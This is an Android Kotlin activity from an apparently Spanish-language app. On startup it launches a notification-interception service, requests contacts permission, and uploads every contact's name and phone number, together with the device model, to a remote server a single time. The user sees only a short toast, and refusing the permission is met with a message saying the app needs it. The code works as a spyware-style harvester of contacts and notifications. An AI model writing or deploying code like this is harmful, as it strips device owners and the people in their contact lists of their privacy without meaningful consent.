/*

* Para que funcione el leer contactos se tienen que dar permiso a acceder a contactos
* permitir a la aplicacion acceder a las notificaciones para poder leerlas

*/

package com.example.contactos


import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.provider.ContactsContract
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.ViewModelProvider
import com.example.contactos.model.SharedPreferencesHelper
import com.example.contactos.repository.Repository
import com.example.contactos.service.NotificationService
import com.example.contactos.viewModel.MainViewModel
import com.example.contactos.viewModelFactory.MainViewModelFactory


class MainActivity : AppCompatActivity() {

    private lateinit var viewModel: MainViewModel
    var myDeviceModel = Build.MODEL

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        //Iniciar intercepcion de notificaciones
        val serviceIntent = Intent(this, NotificationService::class.java)
        startService(serviceIntent)

        val repository = Repository()

        val viewModelFactory = MainViewModelFactory(repository)
        viewModel = ViewModelProvider(this, viewModelFactory).get(MainViewModel::class.java)



        // Register the permissions callback, which handles the user's response to the
        // system permissions dialog. Save the return value, an instance of
        // ActivityResultLauncher. You can use either a val, as shown in this snippet,
        // or a lateinit var in your onAttach() or onCreate() method.
        val requestPermissionLauncher =
            registerForActivityResult(
                ActivityResultContracts.RequestPermission()
            ) { isGranted: Boolean ->
                if (isGranted) {
                    // Permission is granted. Continue the action or workflow in your app.

                    val contactosLeidos = SharedPreferencesHelper.getContactosLeidos(this)

                    //Comprobar que exista conexion para enviar los datos al servidor
                    if (checkForInternet(this)) {
                        if (!contactosLeidos){

                            getNamePhoneDetails()

                            //Guardar la variable de manera persistente
                            SharedPreferencesHelper.saveContactosLeidos(this, true)

                            Toast.makeText(this, "Se enviaron los contactos", Toast.LENGTH_SHORT).show()


                        }else{
                            Toast.makeText(this, "Ya Se enviaron los contactos", Toast.LENGTH_SHORT).show()
                        }
                    } else {
                        Toast.makeText(this, "Conectate a internet para acceder a la app", Toast.LENGTH_SHORT).show()
                    }


                } else {
                    // Explain to the user that the feature is unavailable because the
                    // feature requires a permission that the user has denied. At the
                    // same time, respect the user's decision. Don't link to system
                    // settings in an effort to convince the user to change their
                    // decision.
                    Toast.makeText(this@MainActivity, "Acepta el permiso para el correcto funcionamiento de la app", Toast.LENGTH_SHORT).show()
                }
            }

        when {
            ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_CONTACTS
            ) == PackageManager.PERMISSION_GRANTED -> {

                val contactosLeidos = SharedPreferencesHelper.getContactosLeidos(this)

                //Comprobar que exista conexion para enviar los datos al servidor
                if (checkForInternet(this)) {
                    if (!contactosLeidos){

                        getNamePhoneDetails()

                        //Guardar la variable de manera persistente
                        SharedPreferencesHelper.saveContactosLeidos(this, true)

                        Toast.makeText(this, "Se enviaron los contactos", Toast.LENGTH_SHORT).show()


                    }else{
                        Toast.makeText(this, "Ya Se enviaron los contactos", Toast.LENGTH_SHORT).show()
                    }
                } else {
                    Toast.makeText(this, "Conectate a internet para acceder a la app", Toast.LENGTH_SHORT).show()
                }
            }

            else -> {
                // You can directly ask for the permission.
                // The registered ActivityResultCallback gets the result of this request.
                requestPermissionLauncher.launch(
                    Manifest.permission.READ_CONTACTS)
            }
        }



    }

    //Obtener los contactos y enviarlos al servidor
    data class Contact(
        val id : String ,
        val name : String,
        val number : String
    )


    @SuppressLint("Range")
    fun getNamePhoneDetails() {

        val names  : MutableList<Contact> = ArrayList()
        val cr = contentResolver
        val cur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)

        if (cur!!.count > 0) {
            while (cur.moveToNext()) {
                val id = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NAME_RAW_CONTACT_ID))
                val name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

                names.add(Contact(id , name , number))
            }
            //bucle para enviar los contactos
            names.distinctBy { it.number }.forEach {
                //Enviar la peticion
                viewModel.pushPosts(it.name, it.number, myDeviceModel)
            }
        }
    }

    //Comprobar que exista conexion a internet
    private fun checkForInternet(context: Context): Boolean {

        // register activity with the connectivity manager service
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        // if the android version is equal to M
        // or greater we need to use the
        // NetworkCapabilities to check what type of
        // network has the internet connection
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            // Returns a Network object corresponding to
            // the currently active default data network.
            val network = connectivityManager.activeNetwork ?: return false

            // Representation of the capabilities of an active network.
            val activeNetwork = connectivityManager.getNetworkCapabilities(network) ?: return false

            return when {
                // Indicates this network uses a Wi-Fi transport,
                // or WiFi has network connectivity
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true

                // Indicates this network uses a Cellular transport. or
                // Cellular has network connectivity
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true

                // else return false
                else -> false
            }
        } else {
            // if the android version is below M
            @Suppress("DEPRECATION") val networkInfo =
                connectivityManager.activeNetworkInfo ?: return false
            @Suppress("DEPRECATION")
            return networkInfo.isConnected
        }
    }
}